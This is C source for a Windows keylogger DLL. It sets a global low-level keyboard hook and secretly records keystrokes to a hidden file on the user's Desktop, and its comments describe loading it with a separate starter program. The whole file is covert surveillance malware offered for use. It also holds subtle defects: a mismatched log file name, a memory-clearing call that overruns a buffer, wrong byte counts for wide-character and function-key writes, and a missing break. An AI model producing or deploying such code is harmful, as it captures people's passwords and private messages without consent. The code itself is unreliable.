// Windows keylogger that logs most keypresses using a global low-level keyboard hook
// Notable missing keys: Shift (state handled, key press just not logged), Ctrl, and Alt
// Outputs to a hidden file named keylogger.txt on the user's Desktop
// Must be compiled as a DLL with Keylogger.h to work because global hooks require DLLs
// Use a complementary executable (such as from KeylogStarter.c) to handle loading and unloading the hook
//  into memory to begin logging

#include "Keylogger.h"
#include <Windows.h>
#include <strsafe.h>

HINSTANCE hThisDll = NULL;
HHOOK hHook = NULL;
HANDLE hLogfile = INVALID_HANDLE_VALUE;
DWORD dwBytesWritten = 0;
BYTE baKeyState[256];
// Hook can produce messages with multiple characters from ToUnicodeEx with no definite limit
// 256 is an arbitrary buffer size that should be large enough to hold any result
WCHAR wcOutput[256];

LRESULT CALLBACK LowLevelKeyboardHook(INT nCode, WPARAM wParam, LPARAM lParam)
{
    if (0 > nCode)
    {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    if (HC_ACTION == nCode)
    {
        KBDLLHOOKSTRUCT* lpHookStruct = (KBDLLHOOKSTRUCT*)lParam;
        HKL hLayout = GetKeyboardLayout(0);
        INT nOutputLen = 0;
        SetFilePointer(hLogfile, 0, 0, FILE_END);
        switch (wParam)
        {
        case WM_KEYDOWN:
            switch (lpHookStruct->vkCode)
            {
            case VK_BACK:
                WriteFile(hLogfile, "[backspace]", 11, &dwBytesWritten, NULL);
                break;
            case VK_TAB:
                WriteFile(hLogfile, "[tab]", 5, &dwBytesWritten, NULL);
                break;
            case VK_RETURN:
                // This return code will be the primary separator for the logfile to
                //   help break it into more readable chunks, hence the extra newline
                WriteFile(hLogfile, "[return]\n", 9, &dwBytesWritten, NULL);
                break;
            case VK_CAPITAL:
                WriteFile(hLogfile, "[caps lock]", 11, &dwBytesWritten, NULL);
                break;
            case VK_ESCAPE:
                WriteFile(hLogfile, "[esc]", 5, &dwBytesWritten, NULL);
                break;
            case VK_SPACE:
                WriteFile(hLogfile, "[space]", 7, &dwBytesWritten, NULL);
                break;
            case VK_END:
                WriteFile(hLogfile, "[end]", 5, &dwBytesWritten, NULL);
                break;
            case VK_HOME:
                WriteFile(hLogfile, "[home]", 6, &dwBytesWritten, NULL);
                break;
            case VK_LEFT:
                WriteFile(hLogfile, "[left arrow]", 12, &dwBytesWritten, NULL);
                break;
            case VK_UP:
                WriteFile(hLogfile, "[up arrow]", 10, &dwBytesWritten, NULL);
                break;
            case VK_RIGHT:
                WriteFile(hLogfile, "[right arrow]", 13, &dwBytesWritten, NULL);
                break;
            case VK_DOWN:
                WriteFile(hLogfile, "[down arrow]", 12, &dwBytesWritten, NULL);
                break;
            case VK_DELETE:
                WriteFile(hLogfile, "[del]", 5, &dwBytesWritten, NULL);
                break;
            case VK_F1:
                WriteFile(hLogfile, "[F1]", 5, &dwBytesWritten, NULL);
                break;
            case VK_F2:
                WriteFile(hLogfile, "[F2]", 5, &dwBytesWritten, NULL);
                break;
            case VK_F3:
                WriteFile(hLogfile, "[F3]", 5, &dwBytesWritten, NULL);
                break;
            case VK_F4:
                WriteFile(hLogfile, "[F4]", 5, &dwBytesWritten, NULL);
                break;
            case VK_F5:
                WriteFile(hLogfile, "[F5]", 5, &dwBytesWritten, NULL);
                break;
            case VK_F6:
                WriteFile(hLogfile, "[F6]", 5, &dwBytesWritten, NULL);
                break;
            case VK_F7:
                WriteFile(hLogfile, "[F7]", 5, &dwBytesWritten, NULL);
                break;
            case VK_F8:
                WriteFile(hLogfile, "[F8]", 5, &dwBytesWritten, NULL);
                break;
            case VK_F9:
                WriteFile(hLogfile, "[F9]", 5, &dwBytesWritten, NULL);
                break;
            case VK_F10:
                WriteFile(hLogfile, "[F10]", 6, &dwBytesWritten, NULL);
                break;
            case VK_F11:
                WriteFile(hLogfile, "[F11]", 6, &dwBytesWritten, NULL);
                break;
            case VK_F12:
                WriteFile(hLogfile, "[F12]", 6, &dwBytesWritten, NULL);
                break;
            default:
                baKeyState[VK_SHIFT] = GetKeyState(VK_SHIFT) >> 8;
                baKeyState[VK_CAPITAL] = GetKeyState(VK_CAPITAL) >> 8;
                baKeyState[VK_RMENU] = GetKeyState(VK_RMENU) >> 8;
                nOutputLen = ToUnicodeEx(lpHookStruct->vkCode,
                    lpHookStruct->scanCode,
                    baKeyState,
                    wcOutput,
                    256,
                    0,
                    hLayout);
                if (1 <= nOutputLen)
                {
                    WriteFile(hLogfile, wcOutput, nOutputLen, &dwBytesWritten, NULL);
                }
                break;
            }
        case WM_KEYUP:
            break;
        case WM_SYSKEYDOWN:
            break;
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

VOID InitLoop()
{
    hHook = SetWindowsHookExW(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardHook, hThisDll, 0);

    MSG mMsg;

    //Message loop
    while (GetMessageW(&mMsg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&mMsg);
        DispatchMessage(&mMsg);
    }

    UnhookWindowsHookEx(hHook);
    hHook = NULL;
}

VOID SetHook()
{
    if (NULL == hHook)
    {
        hHook = SetWindowsHookExW(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardHook, hThisDll, 0);
    }
}

VOID RemoveHook()
{
    if (NULL != hHook)
    {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
}

VOID KeyloggerMain(HINSTANCE hinstDLL) {
    if (NULL == hHook) {
        hThisDll = hinstDLL;
        SecureZeroMemory(&baKeyState, 256);
        SecureZeroMemory(&wcOutput, 1000);
        WCHAR* wcUserProfile = L"%USERPROFILE%";
        WCHAR wcOutputPath[MAX_PATH];
        SecureZeroMemory(wcOutputPath, MAX_PATH);
        ExpandEnvironmentStringsW(wcUserProfile, (LPWSTR) &wcOutputPath, MAX_PATH);
        StringCchCatW(wcOutputPath, MAX_PATH, L"\\Desktop\\keylog.txt");
        hLogfile = CreateFileW(
            wcOutputPath,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_HIDDEN,
            NULL);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        KeyloggerMain(hinstDLL);
        break;

    case DLL_THREAD_ATTACH:
        break;

    case DLL_THREAD_DETACH:
        break;

    case DLL_PROCESS_DETACH:
        if (!CloseHandle(hLogfile))
        {
            hLogfile = INVALID_HANDLE_VALUE;
        }
        if (NULL != hHook)
        {
            UnhookWindowsHookEx(hHook);
            hHook = NULL;
        }
        break;
    }

    return TRUE;
}